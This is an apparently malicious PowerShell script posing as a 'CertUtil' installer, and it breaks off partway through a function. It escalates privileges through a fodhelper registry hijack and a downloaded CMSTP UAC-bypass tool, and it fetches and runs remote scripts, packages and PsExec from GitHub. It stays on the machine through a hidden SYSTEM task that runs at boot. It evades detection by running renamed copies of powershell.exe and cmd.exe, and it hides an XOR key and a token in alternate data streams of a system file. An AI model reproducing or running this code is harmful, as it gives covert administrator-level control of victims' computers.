[CmdletBinding()]
param(
    [switch]$ApplyPolicy,
    [switch]$Resume,
    [switch]$Clean
)

$ErrorActionPreference = 'SilentlyContinue'

# ============================================================
# LOGGING SYSTEM
# ============================================================
$script:LogFile = "$env:PUBLIC\cert.log"
$script:LogMutex = New-Object System.Threading.Mutex($false, "Global\CertUtilLogMutex")

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    try {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
        $pid_ = $PID
        $user = try { [Security.Principal.WindowsIdentity]::GetCurrent().Name } catch { "UNKNOWN" }
        $isSystem = try { ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18") } catch { $false }
        $isAdmin = try { ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false }
        $line = "[$timestamp] [$Level] [PID:$pid_] [User:$user] [System:$isSystem] [Admin:$isAdmin] $Message"

        $mutexTaken = $false
        try {
            $mutexTaken = $script:LogMutex.WaitOne(2000)
            Add-Content -Path $script:LogFile -Value $line -Encoding UTF8 -ErrorAction SilentlyContinue
        } finally {
            if ($mutexTaken) { $script:LogMutex.ReleaseMutex() | Out-Null }
        }
    } catch {
        # Logging must never break the script
    }
}

function Write-LogError {
    param(
        [string]$Context,
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )
    $msg = "ERROR in [$Context]: $($ErrorRecord.Exception.Message)"
    if ($ErrorRecord.InvocationInfo) {
        $msg += " | Line: $($ErrorRecord.InvocationInfo.ScriptLineNumber) | Command: $($ErrorRecord.InvocationInfo.Line.Trim())"
    }
    if ($ErrorRecord.ScriptStackTrace) {
        $msg += " | StackTrace: $($ErrorRecord.ScriptStackTrace -replace "`r?`n", ' <- ')"
    }
    Write-Log -Message $msg -Level "ERROR"
}

Write-Log -Message "==================== SCRIPT START ====================" -Level "INFO"
Write-Log -Message "Args: ApplyPolicy=$ApplyPolicy Resume=$Resume Clean=$Clean" -Level "INFO"
Write-Log -Message "PSVersion: $($PSVersionTable.PSVersion) | Host: $($Host.Name) | PID: $PID" -Level "INFO"
Write-Log -Message "LogFile: $script:LogFile" -Level "INFO"
Write-Log -Message "PSCommandPath: $PSCommandPath | MyInvocation: $($MyInvocation.MyCommand.Path)" -Level "INFO"

# ============================================================
# VARIABLES
# ============================================================
$sharedScriptPath = "$env:PUBLIC\autoexec.ps1"
$sharedScriptUrl  = "https://github.com/Novella2048/CertUtil/raw/refs/heads/main/autoexec.ps1"
$policyRegUrl = "https://github.com/Novella2048/CertUtil/raw/refs/heads/main/policies.reg"
$zipUrl = "https://github.com/Novella2048/CertUtil/raw/refs/heads/main/CertUtil.zip"
$pstoolsUrl = "https://download.sysinternals.com/files/PSTools.zip"
$programBase = "$env:PROGRAMDATA\CertUtil"
$zipCache = "$env:TEMP\CertUtil.zip"

$is64 = (Get-CimInstance Win32_OperatingSystem).OSArchitecture -match '64'
$psexecPath = "$programBase\CertExec.exe"
$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$cmdPath = "$env:SystemRoot\System32\cmd.exe"
$tempPwsh = "$env:TEMP\CertAudio.exe"
$tempCmd = "$env:TEMP\CertConnections.exe"

Write-Log -Message "Vars: sharedScriptPath=$sharedScriptPath | programBase=$programBase | is64=$is64 | psexecPath=$psexecPath | tempPwsh=$tempPwsh | tempCmd=$tempCmd"

# ============================================================
# FUNCTIONS
# ============================================================
function Test-IsSystem {
    Write-Log -Message "ENTER Test-IsSystem"
    $result = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18"
    Write-Log -Message "EXIT Test-IsSystem => $result"
    return $result
}

function Test-IsAdmin {
    Write-Log -Message "ENTER Test-IsAdmin"
    $result = [Security.Principal.WindowsPrincipal]::new(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Log -Message "EXIT Test-IsAdmin => $result"
    return $result
}

function Ensure-SharedScript {
    Write-Log -Message "ENTER Ensure-SharedScript sharedScriptPath=$sharedScriptPath"
    try {
        # Se lo script è già presente ed è "recente", non fare nulla
        if (Test-Path $sharedScriptPath) {
            $existing = Get-Item $sharedScriptPath -ErrorAction SilentlyContinue
            Write-Log -Message "Shared script already exists: size=$($existing.Length) lastWrite=$($existing.LastWriteTime)"
            return $true
        }

        # Caso 1: esecuzione da disco -> copia il file corrente
        $sourcePath = $null
        if ($PSCommandPath -and (Test-Path $PSCommandPath)) { $sourcePath = $PSCommandPath }
        elseif ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) { $sourcePath = $MyInvocation.MyCommand.Path }

        if ($sourcePath -and ($sourcePath -ne $sharedScriptPath)) {
            Write-Log -Message "Copying script from disk: $sourcePath -> $sharedScriptPath"
            try {
                Copy-Item -Path $sourcePath -Destination $sharedScriptPath -Force -ErrorAction Stop
                if (Test-Path $sharedScriptPath) {
                    Write-Log -Message "EXIT Ensure-SharedScript => TRUE (copied from disk)"
                    return $true
                }
            } catch {
                Write-LogError -Context "Ensure-SharedScript:Copy-Item" -ErrorRecord $_
            }
        } else {
            Write-Log -Message "No valid on-disk source path (running in-memory or already at target)" -Level "WARN"
        }

        # Caso 2: esecuzione in-memory -> scarica da URL
        Write-Log -Message "Attempting download from $sharedScriptUrl"
        if (Download-File -Url $sharedScriptUrl -OutPath $sharedScriptPath -Retries 3) {
            Write-Log -Message "EXIT Ensure-SharedScript => TRUE (downloaded from URL)"
            return $true
        }

        # Caso 3: ultima spiaggia -> ricostruisci dall'AST corrente (funziona solo se lo script
        # è in esecuzione da un file, non da -Command, ma ci proviamo comunque)
        Write-Log -Message "Download failed, trying to persist current script content via AST" -Level "WARN"
        try {
            $inv = $MyInvocation.MyCommand
            if ($inv -and $inv.ScriptBlock) {
                $inv.ScriptBlock.ToString() | Out-File -FilePath $sharedScriptPath -Encoding UTF8 -Force
                if (Test-Path $sharedScriptPath) {
                    Write-Log -Message "EXIT Ensure-SharedScript => TRUE (from AST)"
                    return $true
                }
            }
        } catch {
            Write-LogError -Context "Ensure-SharedScript:AST" -ErrorRecord $_
        }

        Write-Log -Message "EXIT Ensure-SharedScript => FALSE (all methods failed)" -Level "ERROR"
        return $false
    } catch {
        Write-LogError -Context "Ensure-SharedScript" -ErrorRecord $_
        Write-Log -Message "EXIT Ensure-SharedScript => FALSE (exception)" -Level "ERROR"
        return $false
    }
}

function Copy-ExecutablesToTemp {
    Write-Log -Message "ENTER Copy-ExecutablesToTemp"
    if (-not (Test-Path $programBase)) {
        Write-Log -Message "programBase not found, creating: $programBase"
        New-Item -ItemType Directory -Path $programBase -Force | Out-Null
    }
    $ok = $true
    if (-not ((Test-Path $powershellPath) -and (Test-Path $tempPwsh))) {
        if (Test-Path $powershellPath) {
            try {
                Copy-Item -Path $powershellPath -Destination $tempPwsh -Force -ErrorAction Stop
                Write-Log -Message "Copied powershell -> $tempPwsh OK"
            } catch {
                Write-LogError -Context "Copy-ExecutablesToTemp:Copy powershell" -ErrorRecord $_
                $ok = $false
            }
        } else {
            Write-Log -Message "powershellPath not found: $powershellPath" -Level "WARN"
            $ok = $false
        }
    } else {
        Write-Log -Message "powershell temp already exists, skip copy"
    }
    if (-not ((Test-Path $cmdPath) -and (Test-Path $tempCmd))) {
        if (Test-Path $cmdPath) {
            try {
                Copy-Item -Path $cmdPath -Destination $tempCmd -Force -ErrorAction Stop
                Write-Log -Message "Copied cmd -> $tempCmd OK"
            } catch {
                Write-LogError -Context "Copy-ExecutablesToTemp:Copy cmd" -ErrorRecord $_
                $ok = $false
            }
        } else {
            Write-Log -Message "cmdPath not found: $cmdPath" -Level "WARN"
            $ok = $false
        }
    } else {
        Write-Log -Message "cmd temp already exists, skip copy"
    }
    Write-Log -Message "EXIT Copy-ExecutablesToTemp => $ok"
    return $ok
}

function Download-File {
    param([string]$Url, [string]$OutPath, [int]$Retries = 3)
    Write-Log -Message "ENTER Download-File Url=$Url OutPath=$OutPath Retries=$Retries"
    if (Test-Path $OutPath) {
        Write-Log -Message "Removing existing OutPath: $OutPath"
        Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
    }
    for ($i = 1; $i -le $Retries; $i++) {
        Write-Log -Message "Download attempt $i/$Retries"
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($Url, $OutPath)
            if (Test-Path $OutPath) {
                $size = (Get-Item $OutPath).Length
                Write-Log -Message "EXIT Download-File => TRUE (size=$size bytes)"
                return $true
            } else {
                Write-Log -Message "Attempt $i completed but file not found" -Level "WARN"
            }
        } catch {
            Write-LogError -Context "Download-File attempt $i" -ErrorRecord $_
            if ($i -lt $Retries) { Start-Sleep -Seconds 3 }
        }
    }
    Write-Log -Message "EXIT Download-File => FALSE (all retries failed)" -Level "ERROR"
    return $false
}

function Download-AndExtractPsExec {
    Write-Log -Message "ENTER Download-AndExtractPsExec"
    try {
        if (-not (Test-Path $programBase)) {
            Write-Log -Message "Creating programBase: $programBase"
            New-Item -ItemType Directory -Path $programBase -Force | Out-Null
        }
        $zipPath = "$programBase\PSTools.zip"
        if (-not (Download-File -Url $pstoolsUrl -OutPath $zipPath)) {
            Write-Log -Message "EXIT Download-AndExtractPsExec => FALSE (download failed)" -Level "ERROR"
            return $false
        }
        if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
            Write-Log -Message "Using Expand-Archive"
            Expand-Archive -Path $zipPath -DestinationPath "$programBase\PSTools" -Force
        } else {
            Write-Log -Message "Using .NET ZipFile"
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, "$programBase\PSTools")
        }
        $psexecSource = if ($is64) {
            Get-ChildItem -Path "$programBase\PSTools" -Recurse -Filter "PsExec64.exe" | Select-Object -First 1
        } else {
            Get-ChildItem -Path "$programBase\PSTools" -Recurse -Filter "PsExec.exe" | Select-Object -First 1
        }
        if (-not $psexecSource) {
            Write-Log -Message "PsExec source not found in PSTools" -Level "ERROR"
            return $false
        }
        Write-Log -Message "Found PsExec source: $($psexecSource.FullName)"
        Copy-Item -Path $psexecSource.FullName -Destination $psexecPath -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        Remove-Item "$programBase\PSTools" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log -Message "EXIT Download-AndExtractPsExec => TRUE"
        return $true
    } catch {
        Write-LogError -Context "Download-AndExtractPsExec" -ErrorRecord $_
        Write-Log -Message "EXIT Download-AndExtractPsExec => FALSE (exception)" -Level "ERROR"
        return $false
    }
}

function Convert-PolicyReg {
    param([string]$Path)
    Write-Log -Message "ENTER Convert-PolicyReg Path=$Path"
    try {
        $content = Get-Content -Path $Path -Raw -ErrorAction Stop
        Write-Log -Message "Read policy reg file, length=$($content.Length)"

        function Try-DecodeBase64 {
            param([string]$Data)
            try {
                $clean = $Data -replace '\s', ''
                if ($clean.Length -eq 0) { return $null }
                if ($clean.Length % 4 -ne 0) {
                    # Prova padding
                    $pad = 4 - ($clean.Length % 4)
                    if ($pad -lt 4) { $clean += ('=' * $pad) }
                }
                if ($clean -notmatch '^[A-Za-z0-9+/=]+$') { return $null }
                return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($clean))
            } catch { return $null }
        }

        function Test-LooksLikeReg {
            param([string]$Text)
            if (-not $Text) { return $false }
            $clean = $Text -replace '^\xEF\xBB\xBF', '' -replace '^\xFF\xFE', '' -replace '^\xFE\xFF', ''
            $clean = $clean.TrimStart()
            return ($clean -match '(?m)^\s*(Windows Registry Editor|\[HKEY_)')
        }

        function Test-LooksLikeBase64 {
            param([string]$Text)
            if (-not $Text) { return $false }
            $clean = $Text -replace '\s', ''
            if ($clean.Length -lt 16) { return $false }
            return ($clean -match '^[A-Za-z0-9+/=]+$')
        }

        # Se il contenuto è già un reg, usa così com'è
        if (Test-LooksLikeReg -Text $content) {
            Write-Log -Message "Content is already a valid .reg file, using as-is"
            return $Path
        }

        # Decodifica iterativa (max 5 layer per sicurezza)
        $current = $content
        $maxLayers = 5
        for ($layer = 1; $layer -le $maxLayers; $layer++) {
            if (-not (Test-LooksLikeBase64 -Text $current)) {
                Write-Log -Message "Layer $layer : content is not base64 anymore, stop"
                break
            }
            $decoded = Try-DecodeBase64 -Data $current
            if (-not $decoded) {
                Write-Log -Message "Layer $layer : base64 decode failed, stop" -Level "WARN"
                break
            }
            $preview = $decoded.Substring(0, [Math]::Min(120, $decoded.Length)) -replace "`r?`n", '\n'
            Write-Log -Message "Layer $layer decoded OK, length=$($decoded.Length), preview='$preview'"

            if (Test-LooksLikeReg -Text $decoded) {
                Write-Log -Message "Layer $layer : result is a valid .reg file"
                $outPath = [System.IO.Path]::ChangeExtension($Path, 'decoded.reg')
                $decoded | Out-File -FilePath $outPath -Encoding ascii -Force
                Write-Log -Message "EXIT Convert-PolicyReg => $outPath (after $layer layer(s))"
                return $outPath
            }

            # Altrimenti continua con il prossimo layer
            $current = $decoded
        }

        Write-Log -Message "EXIT Convert-PolicyReg => $Path (no reg found after $maxLayers layers)" -Level "WARN"
        return $Path
    } catch {
        Write-LogError -Context "Convert-PolicyReg" -ErrorRecord $_
        Write-Log -Message "EXIT Convert-PolicyReg => $Path (exception)"
        return $Path
    }
}


function Start-Fod {
    param([string]$CommandToExecute)
    Write-Log -Message "ENTER Start-Fod Command=$CommandToExecute"
    try {
        # Snapshot log PRIMA del lancio, per capire se il processo elevato scriverà
        $logLinesBefore = 0
        try {
            if (Test-Path $script:LogFile) {
                $logLinesBefore = (Get-Content $script:LogFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
            }
        } catch {}
        Write-Log -Message "FOD: log lines before = $logLinesBefore"

        $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        if (Test-Path "HKCU:\Software\Classes\ms-settings") {
            Write-Log -Message "Removing existing HKCU ms-settings"
            Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        }
        New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
        Write-Log -Message "FOD: created registry path $registryPath"

        # Scrittura affidabile del valore (default) tramite Set-Item
        try {
            Set-Item -Path $registryPath -Value $CommandToExecute -Force -ErrorAction Stop
            Write-Log -Message "FOD: Set-Item (default) OK"
        } catch {
            Write-LogError -Context "Start-Fod:Set-Item (default)" -ErrorRecord $_
            # Fallback con Set-ItemProperty + reg.exe
            try {
                Set-ItemProperty -Path $registryPath -Name "(default)" -Value $CommandToExecute -Force -ErrorAction Stop
                Write-Log -Message "FOD: Set-ItemProperty (default) OK (fallback)"
            } catch {
                Write-LogError -Context "Start-Fod:Set-ItemProperty (default)" -ErrorRecord $_
            }
        }
        New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
        Write-Log -Message "FOD: DelegateExecute set"

        # Verifica readback
        $readDefault = $null
        $readDelegate = $null
        try { $readDefault = (Get-ItemProperty -Path $registryPath -ErrorAction Stop)."(default)" } catch { Write-LogError -Context "Start-Fod:readback default" -ErrorRecord $_ }
        try { $readDelegate = (Get-ItemProperty -Path $registryPath -ErrorAction Stop).DelegateExecute } catch { Write-LogError -Context "Start-Fod:readback DelegateExecute" -ErrorRecord $_ }
        Write-Log -Message "FOD: readback default='$readDefault' delegate='$readDelegate'"

        if ([string]::IsNullOrEmpty($readDefault)) {
            Write-Log -Message "FOD: (default) is empty after write -> forcing with reg.exe" -Level "WARN"
            $regOut = & reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "$CommandToExecute" /f 2>&1
            Write-Log -Message "FOD: reg.exe add output: $regOut"
            try { $readDefault = (Get-ItemProperty -Path $registryPath -ErrorAction Stop)."(default)" } catch {}
            Write-Log -Message "FOD: readback after reg.exe default='$readDefault'"
        }

        Write-Log -Message "FOD: about to launch fodhelper.exe"
        $proc = Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -PassThru
        if ($proc) {
            Write-Log -Message "FOD: fodhelper launched, PID=$($proc.Id)"
        } else {
            Write-Log -Message "FOD: Start-Process returned null (no -PassThru object)" -Level "WARN"
        }

        Start-Sleep -Seconds 5
        Write-Log -Message "FOD: sleep 5s done"

        if ($proc) {
            try {
                $hasExited = $proc.HasExited
                $exitCode = $null
                if ($hasExited) { try { $exitCode = $proc.ExitCode } catch {} }
                Write-Log -Message "FOD: fodhelper HasExited=$hasExited ExitCode=$exitCode"
            } catch {
                Write-LogError -Context "Start-Fod:proc status" -ErrorRecord $_
            }
        }

        # Verifica se il processo elevato ha scritto nel log condiviso
        $logLinesAfter = 0
        try {
            if (Test-Path $script:LogFile) {
                $logLinesAfter = (Get-Content $script:LogFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
            }
        } catch {}
        $elevatedWrote = $logLinesAfter -gt $logLinesBefore
        Write-Log -Message "FOD: log lines after = $logLinesAfter (delta=$($logLinesAfter - $logLinesBefore)) elevatedWrote=$elevatedWrote"

        # Cleanup chiave
        try {
            Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log -Message "FOD: ms-settings removed"
        } catch {
            Write-LogError -Context "Start-Fod:Remove ms-settings" -ErrorRecord $_
        }

        if (-not $elevatedWrote) {
            Write-Log -Message "EXIT Start-Fod => FALSE (no elevated process detected)" -Level "WARN"
            return $false
        }

        Write-Log -Message "EXIT Start-Fod => TRUE"
        return $true
    } catch {
        Write-LogError -Context "Start-Fod" -ErrorRecord $_
        Write-Log -Message "EXIT Start-Fod => FALSE (exception)"
        return $false
    }
}

function Start-Cmstp {
    param([string]$CommandToExecute)
    Write-Log -Message "ENTER Start-Cmstp Command=$CommandToExecute"
    $toolPath = "$env:TEMP\cmstp_bypass.exe"
    $url = if ($is64) {
        "https://github.com/tijme/cmstplua-uac-bypass/raw/master/UACBypassCMSTPLUA.x64.exe"
    } else {
        "https://github.com/tijme/cmstplua-uac-bypass/raw/master/UACBypassCMSTPLUA.x86.exe"
    }
    Write-Log -Message "Start-Cmstp using URL=$url toolPath=$toolPath"
    try {
        $logLinesBefore = 0
        try {
            if (Test-Path $script:LogFile) {
                $logLinesBefore = (Get-Content $script:LogFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
            }
        } catch {}
        Write-Log -Message "CMSTP: log lines before = $logLinesBefore"

        (New-Object System.Net.WebClient).DownloadFile($url, $toolPath)
        if (-not (Test-Path $toolPath)) {
            Write-Log -Message "cmstp bypass tool not downloaded" -Level "ERROR"
            return $false
        }
        Write-Log -Message "Downloaded cmstp bypass, launching"
        $proc = Start-Process -FilePath $toolPath -ArgumentList $CommandToExecute -WindowStyle Hidden -PassThru
        if ($proc) { Write-Log -Message "CMSTP: launched, PID=$($proc.Id)" }
        Start-Sleep -Seconds 5
        try {
            if ($proc) {
                Write-Log -Message "CMSTP: HasExited=$($proc.HasExited) ExitCode=$(if($proc.HasExited){$proc.ExitCode}else{'N/A'})"
            }
        } catch {}

        # Verifica se il processo elevato ha scritto nel log
        $logLinesAfter = 0
        try {
            if (Test-Path $script:LogFile) {
                $logLinesAfter = (Get-Content $script:LogFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
            }
        } catch {}
        $elevatedWrote = $logLinesAfter -gt $logLinesBefore
        Write-Log -Message "CMSTP: log lines after = $logLinesAfter (delta=$($logLinesAfter - $logLinesBefore)) elevatedWrote=$elevatedWrote"

        Remove-Item $toolPath -Force -ErrorAction SilentlyContinue

        if (-not $elevatedWrote) {
            Write-Log -Message "EXIT Start-Cmstp => FALSE (no elevated process detected)" -Level "WARN"
            return $false
        }
        Write-Log -Message "EXIT Start-Cmstp => TRUE"
        return $true
    } catch {
        Write-LogError -Context "Start-Cmstp" -ErrorRecord $_
        Write-Log -Message "EXIT Start-Cmstp => FALSE"
        return $false
    }
}

function New-ResumeTask {
    Write-Log -Message "ENTER New-ResumeTask"
    $action = New-ScheduledTaskAction -Execute $tempPwsh -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -Resume"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType S4U -RunLevel Highest
    try {
        Write-Log -Message "Unregistering existing CertUtilResume task"
        Unregister-ScheduledTask -TaskName "CertUtilResume" -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName "CertUtilResume" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop
        Write-Log -Message "EXIT New-ResumeTask => TRUE (cmdlet)"
        return $true
    } catch {
        Write-LogError -Context "New-ResumeTask:Register-ScheduledTask" -ErrorRecord $_
        Write-Log -Message "Falling back to schtasks XML for resume task"
        try {
            $xmlPath = "$env:TEMP\resume_task.xml"
            $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>"$tempPwsh"</Command><Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -Scope Process -File "$sharedScriptPath" -Resume</Arguments></Exec></Actions>
   <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel><UserId>SYSTEM</UserId><LogonType>S4U</LogonType></Principal></Principals>
</Task>
"@
            $xml | Out-File -FilePath $xmlPath -Encoding unicode -Force
            & schtasks /create /tn "CertUtilResume" /xml $xmlPath /f 2>&1 | Out-Null
            Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
            Write-Log -Message "EXIT New-ResumeTask => TRUE (schtasks)"
            return $true
        } catch {
            Write-LogError -Context "New-ResumeTask:schtasks fallback" -ErrorRecord $_
            Write-Log -Message "EXIT New-ResumeTask => FALSE"
            return $false
        }
    }
}

function Remove-ResumeTask {
    Write-Log -Message "ENTER Remove-ResumeTask"
    try {
        $existing = Get-ScheduledTask -TaskName "CertUtilResume" -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Log -Message "Found CertUtilResume task, unregistering"
            Unregister-ScheduledTask -TaskName "CertUtilResume" -Confirm:$false -ErrorAction Stop
            Write-Log -Message "Unregistered via cmdlet"
        } else {
            Write-Log -Message "CertUtilResume task not found via Get-ScheduledTask"
        }
    } catch {
        Write-LogError -Context "Remove-ResumeTask:Unregister" -ErrorRecord $_
        Write-Log -Message "Falling back to schtasks /delete"
        & schtasks /delete /tn "CertUtilResume" /f 2>&1 | Out-Null
    }
    Write-Log -Message "EXIT Remove-ResumeTask"
}

function Extract-And-Install {
    Write-Log -Message "ENTER Extract-And-Install"
    Remove-Item $programBase -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    New-Item -ItemType Directory -Path $programBase -Force | Out-Null
    Write-Log -Message "Cleaned and recreated programBase: $programBase"

    if (-not (Download-File -Url $zipUrl -OutPath $zipCache)) {
        Write-Log -Message "EXIT Extract-And-Install => FALSE (zip download failed)" -Level "ERROR"
        return $false
    }

    try {
        $bytes = [System.IO.File]::ReadAllBytes($zipCache)
        Write-Log -Message "Zip file size=$($bytes.Length) bytes"
        if ($bytes[0] -ne 0x50 -or $bytes[1] -ne 0x4b -or $bytes[2] -ne 0x03 -or $bytes[3] -ne 0x04) {
            Write-Log -Message "Zip header invalid: $($bytes[0..3] -join ',')" -Level "ERROR"
            Write-Log -Message "EXIT Extract-And-Install => FALSE (bad zip header)"
            return $false
        }
        Write-Log -Message "Zip header OK"
    } catch {
        Write-LogError -Context "Extract-And-Install:ReadAllBytes" -ErrorRecord $_
        Write-Log -Message "EXIT Extract-And-Install => FALSE (read exception)"
        return $false
    }

    try {
        if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
            Write-Log -Message "Extracting via Expand-Archive"
            Expand-Archive -Path $zipCache -DestinationPath $programBase -Force
        } else {
            Write-Log -Message "Extracting via .NET ZipFile"
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipCache, $programBase)
        }
        Write-Log -Message "Extraction done"
    } catch {
        Write-LogError -Context "Extract-And-Install:Expand" -ErrorRecord $_
        Write-Log -Message "EXIT Extract-And-Install => FALSE (extract exception)"
        return $false
    }

    $subFolder = Get-ChildItem $programBase -Directory | Where-Object { $_.Name -like "*CertUtil*" } | Select-Object -First 1
    if ($subFolder) {
        Write-Log -Message "Found subfolder: $($subFolder.FullName), flattening"
        Get-ChildItem $subFolder.FullName | ForEach-Object {
            $dest = Join-Path $programBase $_.Name
            try { Copy-Item -Path $_.FullName -Destination $dest -Force -Recurse -ErrorAction Stop } catch {
                Write-LogError -Context "Extract-And-Install:flatten $($_.Name)" -ErrorRecord $_
            }
        }
        Remove-Item $subFolder.FullName -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        Write-Log -Message "No *CertUtil* subfolder found"
    }

    $file64 = "$programBase\certutil64.exe"
    $file32 = "$programBase\certutil32.exe"
    $target = "$programBase\certutil.exe"

    if ($is64) {
        if (Test-Path $file64) {
            Move-Item -Path $file64 -Destination $target -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Selected certutil64.exe -> certutil.exe"
        } else {
            Write-Log -Message "certutil64.exe not found" -Level "ERROR"
            return $false
        }
        Remove-Item -Path $file32 -Force -ErrorAction SilentlyContinue
    } else {
        if (Test-Path $file32) {
            Move-Item -Path $file32 -Destination $target -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Selected certutil32.exe -> certutil.exe"
        } else {
            Write-Log -Message "certutil32.exe not found" -Level "ERROR"
            return $false
        }
        Remove-Item -Path $file64 -Force -ErrorAction SilentlyContinue
    }

    if (-not (Test-Path $target)) {
        Write-Log -Message "Target certutil.exe not found, searching recursively"
        $found = Get-ChildItem -Path $programBase -Recurse -Include "certutil.exe" -ErrorAction SilentlyContinue | Select-Object -First 1        if ($found) {
            Write-Log -Message "Found certutil.exe at: $($found.FullName)"
            Move-Item -Path $found.FullName -Destination $target -Force
            Remove-Item -Path $file64, $file32 -Force -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "certutil.exe not found anywhere" -Level "ERROR"
            return $false
        }
    }

    $start64 = "$programBase\CertStart64.exe"
    $start32 = "$programBase\CertStart32.exe"
    $startTarget = "$programBase\CertStart.exe"

    if ($is64) {
        if (Test-Path $start64) {
            Move-Item -Path $start64 -Destination $startTarget -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Selected CertStart64.exe -> CertStart.exe"
        } else {
            Write-Log -Message "CertStart64.exe not found" -Level "WARN"
        }
        Remove-Item -Path $start32 -Force -ErrorAction SilentlyContinue
    } else {
        if (Test-Path $start32) {
            Move-Item -Path $start32 -Destination $startTarget -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Selected CertStart32.exe -> CertStart.exe"
        } else {
            Write-Log -Message "CertStart32.exe not found" -Level "WARN"
        }
        Remove-Item -Path $start64 -Force -ErrorAction SilentlyContinue
    }

    $xorKeyPath = "$programBase\xr9999.blob"
    $tkPath = "$programBase\tk9999.blob"
    if (-not (Test-Path $xorKeyPath) -or -not (Test-Path $tkPath)) {
        Write-Log -Message "Missing blob files: xorKey exists=$(Test-Path $xorKeyPath) tk exists=$(Test-Path $tkPath)" -Level "ERROR"
        return $false
    }

    $xorKeyBytes = [System.IO.File]::ReadAllBytes($xorKeyPath)
    $tokenBytes = [System.IO.File]::ReadAllBytes($tkPath)
    if (-not $xorKeyBytes -or $xorKeyBytes.Count -eq 0) {
        Write-Log -Message "xorKey blob empty" -Level "ERROR"
        return $false
    }
    if (-not $tokenBytes -or $tokenBytes.Count -eq 0) {
        Write-Log -Message "token blob empty" -Level "ERROR"
        return $false
    }

    $xorKeyRaw = [System.Text.Encoding]::UTF8.GetString($xorKeyBytes)
    $tokenEnc = [System.Text.Encoding]::UTF8.GetString($tokenBytes)
    Write-Log -Message "Blobs read: xorKeyLen=$($xorKeyRaw.Length) tokenLen=$($tokenEnc.Length)"

    $licensePath = "C:\Windows\System32\License.rtf"
    if (-not (Test-Path $licensePath)) {
        Write-Log -Message "License.rtf not present, creating"
        New-Item -ItemType File -Path $licensePath -Force | Out-Null
    }
    Set-Content -Path $licensePath -Stream "CertKey" -Value $xorKeyRaw -Encoding ASCII -NoNewline -Force
    Set-Content -Path $licensePath -Stream "CertToken" -Value $tokenEnc -Encoding ASCII -NoNewline -Force
    Write-Log -Message "ADS streams written to License.rtf"

    $testKey = Get-Content -Path $licensePath -Stream "CertKey" -Raw -ErrorAction SilentlyContinue
    $testToken = Get-Content -Path $licensePath -Stream "CertToken" -Raw -ErrorAction SilentlyContinue
    if ($testKey -ne $xorKeyRaw -or $testToken -ne $tokenEnc) {
        Write-Log -Message "ADS verification failed: keyMatch=$($testKey -eq $xorKeyRaw) tokenMatch=$($testToken -eq $tokenEnc)" -Level "ERROR"
        return $false
    }
    Write-Log -Message "ADS verification OK"

    Get-ChildItem -Path $programBase -Recurse -File | Where-Object { $_.Extension -ne '.log' } | ForEach-Object {
